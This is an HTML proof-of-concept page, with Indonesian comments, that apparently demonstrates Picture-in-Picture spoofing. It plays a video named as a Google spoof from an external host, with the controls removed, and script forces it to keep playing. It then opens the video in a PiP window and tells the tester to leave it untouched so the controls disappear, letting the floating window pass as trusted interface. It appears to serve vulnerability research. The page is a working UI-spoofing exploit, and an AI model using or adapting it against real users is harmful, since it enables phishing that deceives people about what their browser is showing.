<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PiP PoC</title>
</head>
<body style="font-family: sans-serif; padding: 40px; background: #ffffff;">
  <h1>PiP Spoofing Test</h1>

  <!-- controls DIHAPUS, jadi gak ada tombol play di halaman -->
  <video id="v" autoplay muted playsinline loop src="https://0x403for.github.io/google-spoof-v2.mp4" style="width: 100%;"></video>
  <br><br>
  <button onclick="pip()" style="font-size: 20px; padding: 15px 30px;">Buka PiP</button>
  <p id="o"></p>

  <script>
    var v = document.getElementById('v');
    // Kalau video ke-pause (ke-tap), langsung play lagi otomatis
    v.addEventListener('pause', function(){
      setTimeout(function(){ v.play().catch(function(){}); }, 100);
    });
    // Jaga biar selalu muter
    setInterval(function(){
      if(v.paused){ v.play().catch(function(){}); }
    }, 500);

    async function pip(){
      try{
        await v.play();
        await v.requestPictureInPicture();
        document.getElementById('o').innerText = 'PiP opened. Jangan di-tap PiP-nya, cukup digeser aja. Kontrolnya bakal ilang sendiri 2-3 detik.';
      }catch(e){
        document.getElementById('o').innerText = 'Blocked: ' + e;
      }
    }
  </script>
</body>
</html>
